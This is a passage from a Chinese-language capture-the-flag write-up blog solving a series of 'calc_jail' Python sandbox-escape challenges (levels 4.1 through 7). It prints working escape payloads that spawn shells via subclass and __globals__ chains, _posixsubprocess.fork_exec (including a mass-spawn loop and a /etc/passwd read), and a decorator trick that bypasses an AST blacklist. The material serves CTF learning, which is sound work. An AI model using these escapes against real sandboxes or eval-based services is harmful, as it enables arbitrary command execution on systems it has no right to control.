class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(my_eval_func_0002321(input_data)))</span><br></pre></td></tr></table></figure>

<p>​	可以看到这里是对local和global进行了过滤，不过按这个循序渐进的风格来看，应该是用level4相同的思路进行绕过，拿到global和local，还行</p>
<h4 id="calc-jail-beginner-level4-1"><a href="#calc-jail-beginner-level4-1" class="headerlink" title="calc_jail_beginner_level4.1"></a>calc_jail_beginner_level4.1</h4><p>这题也没给源码</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532885.png?raw=true" alt="image-20240605161513654"></p>
<p>但是可以看到很干脆，给了ban掉的东西</p>
<p>bytes用不了了，但是之前那个doc还是能用的</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532003.png?raw=true" alt="image-20240605182621026"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532384.png?raw=true" alt="image-20240605182841509"></p>
<p>当然，还有一种是之前bytes延伸出来的解法</p>
<p>利用Show subclasses with tuple找到<code>bytes</code>类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532289.png?raw=true" alt="image-20240605183049158"></p>
<p>一顿好找之后，发现bytes类在第六位，用之前的索引的方法进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原payload:</span><br><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</span><br><span class="line"></span><br><span class="line">最终payload:</span><br><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())</span><br><span class="line">//这里我们用subclasses的第六位索引进行了bytes的替换</span><br></pre></td></tr></table></figure>



<h4 id="calc-jail-beginer-level4-2"><a href="#calc-jail-beginer-level4-2" class="headerlink" title="calc_jail_beginer_level4.2"></a>calc_jail_beginer_level4.2</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532971.png?raw=true" alt="image-20240605183446140"></p>
<p>可以看到连加号都ban了，这样一来就没办法直接套用之前那个doc的方法了，但是这个加号是有能替换的</p>
<p>用join的方法，拼出四位数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.join([&#x27;4&#x27;, &#x27;3&#x27;, &#x27;9&#x27;, &#x27;6&#x27;])</span><br></pre></td></tr></table></figure>

<p>此处前面的’’两个单引号需要绕过，可以用str()来代替</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532859.png?raw=true" alt="image-20240605183949779"></p>
<p>还有一种就是上一题的bytes被ban的情况，这里只多ban了个加号，应该是考字符串拼接绕过的，无伤大雅</p>
<h4 id="calc-jail-beginner-level4-3"><a href="#calc-jail-beginner-level4-3" class="headerlink" title="calc_jail_beginner_level4.3"></a>calc_jail_beginner_level4.3</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532797.png?raw=true" alt="image-20240605185315712"></p>
<p>多ban了type和open，限制我们无法直接open，但是之前的两种payload还是能用的，所以直接打就好了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532853.png?raw=true" alt="image-20240605185453837"></p>
<p>包得吃的</p>
<h4 id="calc-jail-beginner-level5"><a href="#calc-jail-beginner-level5" class="headerlink" title="calc_jail_beginner_level5"></a>calc_jail_beginner_level5</h4><p>我超，这下啥都不给了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532488.png?raw=true" alt="image-20240605185642215"></p>
<p>就给了一个dir()的提示</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532948.png?raw=true" alt="image-20240605185726018"></p>
<p>照着提示输入dir()，有俩文件，还有一个builtins，这是在提醒我这个玩意能被我用吗</p>
<p>发现eval(input())这个手法并没有失效</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532631.png?raw=true" alt="image-20240605190140153"></p>
<p>直接拿shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532814.png?raw=true" alt="image-20240605190359487"></p>
<p>我也是小试牛刀了一回</p>
<h4 id="calc-jail-beginner-level5-1"><a href="#calc-jail-beginner-level5-1" class="headerlink" title="calc_jail_beginner_level5.1"></a>calc_jail_beginner_level5.1</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532404.png?raw=true" alt="image-20240605190540016"></p>
<p>和level5一样啊，看看dir()能不能出一些好的提示</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532642.png?raw=true" alt="image-20240605190603572"></p>
<p>怎么好像又能用了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532021.png?raw=true" alt="image-20240605190645950"></p>
<p>把我的eval给干掉了，试试看别的方法吧</p>
<p>发现help()也不行啊，看来是ban了之前短payload那一连串了，看看doc</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532233.png?raw=true" alt="image-20240605190900992"></p>
<p>可以看到doc是得行的啊，把之前的payload拉下来用</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532194.png?raw=true" alt="image-20240605191000465"></p>
<p>但是照搬是不得行滴，看来需要另外搓一搓</p>
<p>​	看了大佬的题解，发现思路跑偏了，其实不用doc，用之前那个就能打，只不过我粗心没深入看那个builtins，看看里面能被利用的东西吧</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532824.png?raw=true" alt="image-20240605191319697"></p>
<p>open被干掉了，上常规思路吧</p>
<p>Show subclasses with tuple</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532179.png?raw=true" alt="image-20240605191413930"></p>
<p>老流程，找到第六个os，getshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-6].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>



<h4 id="calc-jail-beginner-level6"><a href="#calc-jail-beginner-level6" class="headerlink" title="*calc_jail_beginner_level6"></a>*calc_jail_beginner_level6</h4><p>进入题目，真是大不一样啊</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533371.png?raw=true" alt="image-20240605211030100"></p>
<p>几乎所有的hook都被ban了，留了些残羹剩饭给我</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builtins.input,builtins.input/result,exec,compile</span><br></pre></td></tr></table></figure>

<p>这里引进一个新奇小玩意</p>
<p><strong>_posixsubprocess 模块</strong></p>
<p>这是Python的一个内部模块，具体作用就是提供一个在UNIX平台上创建子进程的低级别接口。我们熟悉的subprocess模块的实现就用到了这个</p>
<p>​	这个模块的核心功能就是fork_exec函数，fork_exec又提供了一个相当底层的方法来创建子进程，并且在这个新的进程中可以执行一个指定的程序。值得一提的是这个模块并不会在python的标准库文档里面被列出,当然每个版本的python都会有差异</p>
<p>​	以一个python3.11的具体函数声明作为实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">def fork_exec(</span><br><span class="line">    __process_args: Sequence[StrOrBytesPath] | None,</span><br><span class="line">    #传递给新进程的命令行参数，通常是程序路径及其参数列表</span><br><span class="line">    __executable_list: Sequence[bytes],</span><br><span class="line">    #可执行程序路径的列表</span><br><span class="line">    __close_fds: bool,</span><br><span class="line">    #若设置为True，则在新进程当中关闭所有的文件描述符</span><br><span class="line">    __fds_to_keep: tuple[int, ...],</span><br><span class="line">    #新进程的工作目录</span><br><span class="line">    __cwd_obj: str,</span><br><span class="line">    #新进程的工作目录</span><br><span class="line">    __env_list: Sequence[bytes] | None,</span><br><span class="line">    #环境变量列表，是键和值的序列，比如：[&quot;PATH=/usr/bin&quot;, &quot;HOME=/home/user&quot;]</span><br><span class="line">    </span><br><span class="line">    __p2cread: int,</span><br><span class="line">    __p2cwrite: int,</span><br><span class="line">    __c2pred: int,</span><br><span class="line">    __c2pwrite: int,</span><br><span class="line">    __errread: int,</span><br><span class="line">    __errwrite: int,</span><br><span class="line">    #这些是文件描述符，用于在父子进程之间进行通信</span><br><span class="line">    </span><br><span class="line">    __errpipe_read: int,</span><br><span class="line">    __errpipe_write: int,</span><br><span class="line">    #这两个文件描述符用于父子进程之间的错误通信</span><br><span class="line">    </span><br><span class="line">    __restore_signals: int,</span><br><span class="line">    #若设置为，则在新建的子进程当中恢复默认的信号处理</span><br><span class="line">    __call_setsid: int,</span><br><span class="line">    #若设置为，则会在新进程当中创建新的会话</span><br><span class="line">    __pgid_to_set: int,</span><br><span class="line">    #设置新进程的进程组ID</span><br><span class="line">    </span><br><span class="line">    __gid_object: SupportsIndex | None,</span><br><span class="line">    __groups_list: list[int] | None,</span><br><span class="line">    __uid_object: SupportsIndex | None,</span><br><span class="line">    #这些参数用于设置新进程的用户ID以及组ID</span><br><span class="line">    __child_umask: int,</span><br><span class="line">    #设置新进程的umask</span><br><span class="line">    __preexec_fn: Callable[[], None],</span><br><span class="line">    #在新进程当中执行的函数，会在新进程的主体部分执行前调用</span><br><span class="line">    __allow_vfork: bool,</span><br><span class="line">    #若设置为Ture，则在可能的情况下使用vfork而不是fork，这个vfork又是一个更高效的fork,只不过可能会存在一些问题，具体什么问题还得我深入学习python后才能知晓</span><br><span class="line">) -&gt; int: ...</span><br></pre></td></tr></table></figure>

<p>这里有一个最小化示例，说实在的设置这些乱七八糟的真烦吧，自己拿来改改还成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)</span><br></pre></td></tr></table></figure>

<p>​	OK，我们介绍完这个玩意后，就得回来看看题目了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533822.png?raw=true" alt="image-20240606183317636"></p>
<p>我们看这里不是有一个builtins吗，往里弄</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[&#x27;__loader__&#x27;].load_module(&#x27;_posixsubprocess&#x27;)</span><br><span class="line">or</span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;)</span><br><span class="line"></span><br><span class="line">#都是将这个posixsubprocss动态加载到loader当中</span><br><span class="line"></span><br><span class="line">#__loader__：加载器在导入的模块上设置的属性，访问时返回加载器对象本身。</span><br></pre></td></tr></table></figure>

<p>然后posixsubprocess的payload则是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>

<p>值得一提的是这个payload似乎有点不稳定，会蹦出一些python代码，而不是直接拿shell，多交几次才能出shell</p>
<p>等我变强了再来研究研究为什么吧</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533261.png?raw=true" alt="image-20240606185720026"></p>
<h4 id="calc-jail-beginner-level6-1"><a href="#calc-jail-beginner-level6-1" class="headerlink" title="calc_jail_beginner_level6.1"></a>calc_jail_beginner_level6.1</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533743.png?raw=true" alt="image-20240606185822099"></p>
<p>上次的level6我们之所以能用那个方法getshell，其主要原因除了并没有ban掉这个对应模块外，还有一部分原因是并没有对我们输入payload的次数作出严格限制</p>
<p>而这题则不相同，下面这个code of python jail限制了我们只能输入一次payload</p>
<p>我getshell尚且还需要ls一下，你这个输入次数限制是不是有点太超过了</p>
<p>这里就要引用一下python3.8之后的抽象怪东西——<strong>海象运算符</strong></p>
<p>我们都知道海象长这样</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533389.png?raw=true" alt="image-20240606190203368"></p>
<p>之所以说海象运算符抽象是因为</p>
<p><strong>它他妈的还真长得像海象</strong></p>
<p>​	<em>需要注意的是，海象运算符其实算是一种特殊的表达式，并不是一个赋值语句，这有什么不同呢？</em></p>
<p>​	我们都知道赋值语句一般都是s&#x3D;b这样的，但是你看，我们用完这个s&#x3D;b之后，是不是妹有返回值啊</p>
<p>​	但是海象运算符会</p>
<p>因为海象运算符本质上是一种特殊的表达式，是一种逻辑的表达，所以它是有返回值的，并且海象运算符不能单独成为一行，因为海象运算符是为了实际运用所创造出来的一种表达式，所以如果妹有应用场景的话，单独列一行海象运算符是不正确滴（此处联想奥卡姆剃刀）</p>
<p>​	海象运算符主要目的就是同时进行赋值和表达式计算的工作</p>
<p>比如一个循环</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while(n&lt;5)：</span><br><span class="line">	print(n)</span><br><span class="line">	n = n++</span><br></pre></td></tr></table></figure>

<p>我们可以这样写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while(n:= n++)&lt;5:</span><br><span class="line">	print(n)</span><br></pre></td></tr></table></figure>

<p>OK，海象介绍完毕，接下来给payload</p>
<p>因为这个payload还是和上一题一样的原理，只不过是夹杂了海象运算符来处理无法多次输入命令的问题，所以就偷个懒不解释了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[os := __import__(&#x27;os&#x27;), _posixsubprocess := __loader__.load_module(&#x27;_posixsubprocess&#x27;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]</span><br></pre></td></tr></table></figure>

<p>哎呀还是让AI来解释解释吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">os := __import__(&#x27;os&#x27;): 这行代码使用Python的__import__函数动态地导入os模块，并将引用赋值给变量os。os模块提供了许多与操作系统交互的功能。</span><br><span class="line"></span><br><span class="line">_posixsubprocess := __loader__.load_module(&#x27;_posixsubprocess&#x27;): 这行代码使用__loader__（通常是当前模块的加载器）动态加载_posixsubprocess模块，并将引用赋值给变量_posixsubprocess。_posixsubprocess模块允许创建新进程并与其通信。</span><br><span class="line"></span><br><span class="line">[_posixsubprocess.fork_exec(...) for i in range(100000)]: 这是一个列表推导式，它尝试执行_posixsubprocess.fork_exec函数100000次。fork_exec函数用于创建一个新的进程并执行指定的程序。</span><br><span class="line"></span><br><span class="line">fork_exec函数的参数如下：</span><br><span class="line">[b&quot;/bin/sh&quot;]: 要执行的命令，这里是二进制形式的/bin/sh。</span><br><span class="line">[b&quot;/bin/sh&quot;]: 命令的参数列表，这里传递了/bin/sh自身作为参数。</span><br><span class="line">True: 表示在新进程中执行。</span><br><span class="line">(): 环境变量，空元组表示使用当前环境。</span><br><span class="line">None: 表示不设置任何额外的执行路径或文件行为。</span><br><span class="line">一系列-1: 这些参数通常用于设置进程的文件描述符，这里使用-1表示使用默认行为。</span><br><span class="line">*(os.pipe()): 使用os.pipe()创建一个管道，并将其作为标准输入、输出和错误输出传递给新进程。</span><br><span class="line">False: 表示不重定向标准错误流。</span><br><span class="line">None: 表示不设置任何其他配置参数。</span><br><span class="line">range(100000): 这个函数生成一个从0到99999的整数序列，用于列表推导式中的迭代。</span><br><span class="line">综合来看，这段payload的作用是尝试创建大量的新进程，每个进程都执行/bin/sh。这种行为可能是为了发起拒绝服务攻击（DoS），通过创建过多的进程来耗尽系统资源。</span><br></pre></td></tr></table></figure>

<p>这个暴力getshell真是野蛮，但是我也不会更优雅的方法啦</p>
<p>cat &#x2F;flag按到冒烟了</p>
<h4 id="calc-jail-beginner-level7"><a href="#calc-jail-beginner-level7" class="headerlink" title="calc_jail_beginner_level7"></a>calc_jail_beginner_level7</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533665.png?raw=true" alt="image-20240607203500140"></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533057.png?raw=true" alt="image-20240607205647139"></p>
<p>那么好了好了，重头戏来了，AST逃逸！！！！</p>
<p>​	肾么是AST捏</p>
<p>AST是一种源代码的抽象语法结构的树状表示，树上的每个节点都表示源代码当中的一种结构，所以很抽象</p>
<p>​	抽象语法树并不会表现出真实语法出现的每一处细节，比如说嵌套括号被隐含树的结构中，并没有以节点的形式呈现。</p>
<p>​	在沙箱的应用中，AST会将我们的输入转化为操作码，这个时候从字符串层面的变换基本上就没用了</p>
<p>​	一般来说我们考虑绕过AST黑名单</p>
<p>​	如果基于AST的沙箱限制了执行函数，那么就需要找到一种不需要执行函数的方式来执行系统命令</p>
<p>​	比如说装饰器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">装饰器（decorators）是 Python 中的一种高级功能，它允许你动态地修改函数或类的行为。</span><br><span class="line"></span><br><span class="line">装饰器是一种函数，它接受一个函数作为参数，并返回一个新的函数或修改原来的函数。</span><br><span class="line"></span><br><span class="line">装饰器的语法使用 **@decorator_name** 来应用在函数或方法上。</span><br><span class="line"></span><br><span class="line">Python 还提供了一些内置的装饰器，比如 **@staticmethod** 和 **@classmethod**，用于定义静态方法和类方法。</span><br><span class="line"></span><br><span class="line">Python 装饰允许在不修改原有函数代码的基础上，动态地增加或修改函数的功能，装饰器本质上是一个接收函数作为输入并返回一个新的包装过后的函数的对象。</span><br></pre></td></tr></table></figure>

<p>回到本题，找到的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@exec</span><br><span class="line">@input</span><br><span class="line">class X: pass</span><br></pre></td></tr></table></figure>

<p>由于这个装饰器不会被解析为调用表达式或者语句，所以可以绕过黑名单，并且最终的payload也是由input接收的，这里并没有对input作出肾么限制，所以也不会被拦截</p>
<p>输入这串payload之后，我们就可以导入我们的os模块进行getshell了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; @exec</span><br><span class="line">... @input</span><br><span class="line">... class X:</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&lt;class &#x27;__main__.X&#x27;&gt;__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<p>把他们的源码也扒下来了，嘻嘻</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">import ast</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    _       _ _   _                _                         _                _ ______ </span><br><span class="line">   (_)     (_) | | |              (_)                       | |              | |____  |</span><br><span class="line">    _  __ _ _| | | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| |   / / </span><br><span class="line">   | |/ _` | | | | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__| | |/ _ \ \ / / _ \ |  / /  </span><br><span class="line">   | | (_| | | | | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ | / /   </span><br><span class="line">   | |\__,_|_|_| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|/_/    </span><br><span class="line">  _/ |                        __/ |                                                    </span><br><span class="line"> |__/                        |___/                                                     </span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def verify_ast_secure(m):</span><br><span class="line">  for x in ast.walk(m):</span><br><span class="line">    match type(x):</span><br><span class="line">      case (ast.Import|ast.ImportFrom|ast.Call|ast.Expr|ast.Add|ast.Lambda|ast.FunctionDef|ast.AsyncFunctionDef|ast.Sub|ast.Mult|ast.Div|ast.Del):</span><br><span class="line">        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)</span><br><span class="line">        return False</span><br><span class="line">  return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exexute_code(my_source_code):</span><br><span class="line">  print(&quot;Pls input your code: (last line must contain only --HNCTF)&quot;)</span><br><span class="line">  while True:</span><br><span class="line">    line = sys.stdin.readline()</span><br><span class="line">    if line.startswith(&quot;--HNCTF&quot;):</span><br><span class="line">      break  </span><br><span class="line">    my_source_code += line</span><br><span class="line"></span><br><span class="line">  tree_check = compile(my_source_code, &quot;input_code.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">  if verify_ast_secure(tree_check):</span><br><span class="line">    print(&quot;check is passed!now the result is:&quot;)</span><br><span class="line">    compiled_code = compile(my_source_code, &quot;input_code.py&quot;, &#x27;exec&#x27;)</span><br><span class="line">    exec(compiled_code)</span><br><span class="line">  print(&quot;Press any key to continue&quot;)</span><br><span class="line">  sys.stdin.readline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  os.system(&quot;clear&quot;)</span><br><span class="line">  print(WELCOME)</span><br><span class="line">  print(&quot;=================================================================================================&quot;)</span><br><span class="line">  print(&quot;==           Welcome to the calc jail beginner level7,It&#x27;s AST challenge                       ==&quot;)</span><br><span class="line">  print(&quot;==           Menu list:                                                                        ==&quot;)</span><br><span class="line">  print(&quot;==             [G]et the blacklist AST                                                         ==&quot;)</span><br><span class="line">  print(&quot;==             [E]xecute the python code                                                       ==&quot;)</span><br><span class="line">  print(&quot;==             [Q]uit jail challenge                                                           ==&quot;)</span><br><span class="line">  print(&quot;=================================================================================================&quot;)</span><br><span class="line">  ans = (sys.stdin.readline().strip()).lower()</span><br><span class="line">  if ans == &#x27;g&#x27;:</span><br><span class="line">     print(&quot;=================================================================================================&quot;)</span><br><span class="line">     print(&quot;==        Black List AST:                                                                      ==&quot;)</span><br><span class="line">     print(&quot;==                       &#x27;Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==&quot;)</span><br><span class="line">     print(&quot;==                        Sub,Mult,Div,Del&#x27;                                                    ==&quot;)</span><br><span class="line">     print(&quot;=================================================================================================&quot;)</span><br><span class="line">     print(&quot;Press any key to continue&quot;)</span><br><span class="line">     sys.stdin.readline()</span><br><span class="line">  elif ans == &#x27;e&#x27;:</span><br><span class="line">    my_source_code = &quot;&quot;</span><br><span class="line">    exexute_code(my_source_code)</span><br><span class="line">  elif ans == &#x27;q&#x27;:</span><br><span class="line">    print(&quot;Bye&quot;)</span><br><span class="line">    quit()</span><br><span class="line">  else:</span><br><span class="line">    print(&quot;Unknown options!&quot;)</span><br><span class="line">    quit()$ </span><br></pre></td></tr></table></figure>

<p>其实这个东西还能用help直接进入帮助文档，然后拿下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@help</span><br><span class="line">class X:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>然后!sh也能拿下</p>
<h4 id="lake-lake-lake"><a href="#lake-lake-lake" class="headerlink" title="lake lake lake"></a>lake lake lake</h4><p>进入题目捏，这个给了源码的，由于我是之前做完了前面那几道题才来做的，这个就比较小巫见大巫了</p>
